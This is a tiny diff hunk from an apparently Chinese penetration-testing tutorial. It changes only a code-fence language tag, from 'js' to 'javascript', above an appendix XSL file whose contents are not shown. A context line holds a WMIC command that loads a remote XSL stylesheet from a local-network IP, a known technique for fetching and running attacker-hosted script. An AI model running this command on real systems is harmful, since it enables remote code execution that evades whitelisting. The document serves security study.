@@ -80,7 +80,7 @@ WMIC.exe os get /format:"http://192.168.1.4/Micropoor_2003.xsl"
 
 ### 附录：
 **Micropoor_Win7.xsl：**
-```js
+```javascript
 <?xml version='1.0'?>
 
 <stylesheet
